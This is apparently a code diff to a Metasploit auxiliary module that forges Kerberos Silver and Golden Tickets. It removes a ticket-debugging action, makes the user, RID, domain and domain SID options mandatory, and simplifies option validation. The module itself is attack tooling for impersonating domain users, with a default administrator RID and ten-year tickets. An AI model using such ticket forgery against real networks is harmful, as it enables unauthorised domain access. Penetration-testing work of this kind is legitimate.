@@ -33,7 +33,6 @@ class MetasploitModule < Msf::Auxiliary
         'Actions' => [
           ['FORGE_SILVER', { 'Description' => 'Forge a Silver Ticket' } ],
           ['FORGE_GOLDEN', { 'Description' => 'Forge a Golden Ticket' } ],
-          ['DEBUG_TICKET', { 'Description' => 'Print out the contents of a ticket for debugging' } ]
         ],
         'DefaultAction' => 'FORGE_SILVER'
       )
@@ -41,15 +40,14 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('USER', [ false, 'The Domain User' ]),
-        OptInt.new('USER_RID', [ false, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
+        OptString.new('USER', [ true, 'The Domain User' ]),
+        OptInt.new('USER_RID', [ true, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
         OptString.new('NTHASH', [ false, 'The krbtgt/service nthash' ]),
         OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),
-        OptString.new('DOMAIN', [ false, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
-        OptString.new('DOMAIN_SID', [ false, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
+        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
+        OptString.new('DOMAIN_SID', [ true, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
         OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], regex: %r{.*/.*}),
-        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650]),
-        OptString.new('TICKET_PATH', [false, 'Path to the ticket you wish to debug'])
+        OptInt.new('DURATION', [ true, 'Duration of the ticket in days', 3650]),
       ]
     )
     deregister_options('RHOSTS', 'RPORT', 'Timeout')
@@ -63,8 +61,6 @@ class MetasploitModule < Msf::Auxiliary
       forge_silver
     when 'FORGE_GOLDEN'
       forge_golden
-    when 'DEBUG_TICKET'
-      debug_ticket
     else
       fail_with(Msf::Module::Failure::BadConfig, "Invalid action #{action.name}")
     end
@@ -96,23 +92,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def forge_silver
-    validate_options('SPN')
+    raise Msf::OptionValidateError, 'SPN' if datastore['SPN'].blank?
+
+    validate_key
     sname = datastore['SPN'].split('/', 2)
     flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
     forge_ccache(sname: sname, flags: flags)
   end
 
   def forge_golden
-    validate_options
+    validate_key
     sname = ['krbtgt', datastore['DOMAIN'].upcase]
     flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
     forge_ccache(sname: sname, flags: flags)
-  end
-
-  def debug_ticket
-    fail_with(Msf::Exploit::Failure::BadConfig, 'TICKET_PATH must be set for debugging') if datastore['TICKET_PATH'].blank?
-    enc_key, = get_enc_key_and_type
-    print_contents(datastore['TICKET_PATH'], key: enc_key)
   end
 
   def get_enc_key_and_type
@@ -132,17 +124,6 @@ class MetasploitModule < Msf::Auxiliary
 
     enc_key = key.nil? ? nil : [key].pack('H*')
     [enc_key, enc_type]
-  end
-
-  def validate_options(*extra_options)
-    unset_options = []
-    mandatory_options = %w[DOMAIN USER USER_RID DOMAIN_SID].concat(extra_options)
-    mandatory_options.each do |option|
-      unset_options << option if datastore[option].blank?
-    end
-    raise Msf::OptionValidateError, unset_options unless unset_options.empty?
-
-    validate_key
   end
 
   def validate_key
